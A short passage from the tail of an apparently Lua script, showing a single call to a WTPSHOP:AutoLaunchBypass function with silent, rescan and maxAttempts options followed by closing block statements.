            WTPSHOP:AutoLaunchBypass({ silent = false, rescan = true, maxAttempts = 8 })
        end
    end)
end
